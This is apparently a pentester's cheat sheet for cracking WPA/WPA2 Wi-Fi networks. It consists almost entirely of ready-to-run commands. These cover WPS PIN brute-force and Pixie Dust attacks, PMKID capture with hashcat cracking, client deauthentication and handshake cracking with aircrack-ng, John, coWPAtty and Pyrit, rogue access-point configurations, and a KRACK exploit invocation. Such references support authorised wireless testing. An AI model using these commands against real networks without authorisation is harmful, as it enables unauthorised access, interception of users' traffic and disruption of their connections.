# WPA/WPA2 Cracking

## WPS PIN Attack

### Known PINs + Generation Algorithms
```bash
airgeddon.sh  # Known PINs database based attack
```

### WPS PIN Bruteforce (online)
```bash
reaver -i mon0 -b <MAC_AP> -c <channel> -f -N -L -d 2 -vv
bully mon0 -b <MAC_AP> -c <channel> -S -F -B -v 3
```

### WPS Pixie Dust Attack (offline)
```bash
reaver -i mon0 -b <MAC_AP> -c <channel> -K -N -vv
bully mon0 -b <MAC_AP> -d -v 3
```

### Null PIN Attack
```bash
reaver -i mon0 -b <MAC_AP> -c <channel> -f -N -g 1 -vv -p ""
```

### WPS PIN Attack Automated
```bash
wifite --wps-only [--bully]
```

---

## PMKID Capture (Clientless) & Cracking

```bash
hcxdumptool -i mon0 -o capture.pcapng --enable_status=1 -c <channel>
hcxpcaptool -E essidlist -I identitylist -U usernamelist -z capture.16800 capture.pcapng
hashcat -m 16800 capture.16800 -a 0 -w 4 <wordlist>
```

**Automated:**
```bash
wifite --pmkid [--pmkid-timeout <sec>]
```

---

## Cracking WPA/WPA2-PSK with Aircrack-ng

```bash
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Deauthentication attack
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Crack
aircrack-ng <CAPTURE_NAME> -w <PASSWORDS_WORDLIST>
```

---

## Precomputed WPA Keys Database Attack

### Capture Handshake
```bash
airmon-ng start <INTERFACE>
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>
```

### Generate PMK Database
```bash
# Put ESSID inside a file
echo "<ESSID>" > ESSID.txt

# Import ESSID in database
airolib-ng <DB_NAME> --import essid ESSID.txt

# Import passwords list
airolib-ng <DB_NAME> --import passwd <PASSWORDS_WORDLIST>

# Generate PMK
airolib-ng <DB_NAME> --batch

# Crack with precomputed PMK
aircrack-ng -r <DB_NAME> <Handshaked_PCAP>
```

---

## Cracking WPA with John The Ripper and Aircrack-ng

```bash
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Deauthentication attack
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Crack with john
john -wordlist=<PASSWORDS_WORDLIST> --rules -stdout | aircrack-ng -0 -e <ESSID> -w - <CAPTURE_NAME>
```

**or via .hccap:**
```bash
# Capture to .hccap
aircrack-ng <CAPTURE_NAME> -J john_out

# .hccap to john syntax
hccap2john john_out.hccap > out

# Crack with john
john -wordlist=<PASSWORDS_WORDLIST> --rules out
```

---

## Cracking WPA with coWPAtty

```bash
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Deauthentication attack
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# coWPAtty needs a full valid handshake, check if it can use it
cowpatty -r <CAPTURE_NAME> -c

# IF the handshake is full you can continue
# ELSE crack it with aircrack-ng

# Crack (slow, better use aircrack-ng)
cowpatty -r <CAPTURE_NAME> -f <PASSWORDS_WORDLIST> -s <SSID>

# Generate hashes for the specific SSID (slow to generate)
genpmk -s <SSID> -f <PASSWORDS_WORDLIST> -d <HASHES_FILENAME>

# Crack (very fast)
cowpatty -r <PASSWORDS_WORDLIST> -d <HASHES_FILENAME> -s <SSID>
```

---

## Cracking WPA with Pyrit

```bash
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Deauthentication attack
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Crack (slow, better use aircrack-ng)
pyrit -r <CAPTURE_NAME> -b <BSSID> -i <PASSWORDS_WORDLIST> attack_passthrough
```

**or with database:**
```bash
# Import passwords list
pyrit -i <PASSWORDS_WORDLIST> import_passwords

# Import ESSID in database
pyrit -e <ESSID> create_essid

# Generate hashes for the specific SSID (slow to generate, but faster than coWPAtty)
pyrit batch

# Crack (very fast)
pyrit -r <CAPTURE_NAME> attack_db
```

---

## Airgraph-ng (AP-less Attack)

> You will need to have a probing client within the vicinity or range, create a fake access point, wait the client to connect and capture the 4-way handshake.

```bash
hostapd wpa-psk.conf
```

**wpa1-psk.conf:**
```
interface=wlan1
driver=nl80211
ssid=CorpoWifi
bssid=00:1C:10:00:00:00
wpa=2
wpa_passphrase=wedontcare
wpa_key_mgmt=WPA-PSK
rsn_pairwise=TKIP
channel=1
```

**wpa2-psk.conf:**
```
interface=wlan1
driver=nl80211
ssid=CorpoWifi
bssid=00:1C:10:00:00:00
wpa=2
wpa_passphrase=wedontcare
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
channel=1
```

**References:**
- https://github.com/lutzenfried/Methodology/blob/main/03-Wi-Fi.md#wpa2-ap-less-attack
- https://medium.com/@navkang/ap-less-wpa2-psk-cracking-129174155668

---

## Key Reinstallation Attack (KRACKS)

**KRACK attack or Key Reinstallation Attack.**

**Toolset:**
- https://www.krackattacks.com/
- https://github.com/vanhoefm/krackattacks-scripts
- https://github.com/vanhoefm/krackattacks-poc-zerokey

> When client joins a network it executes the 4-way handshake to negotiate a fresh encryption key (PTK).
> - The key will be installed after receiving the message 3 of the 4-way handshake.
> - In case message 3 is lost or dropped, the Access Point will retransmit message 3 if it did not receive an appropriate response as acknowledgment.
> - As a result client may receive message 3 multiple times, each time it will reinstall the same encryption key and reset the incremental transmit packet number (nonce).

```bash
sudo ./krack-all-zero-tk.py wlan0 wlan1 CorpoWPA2 --target 00:1C:10:00:00:00
```
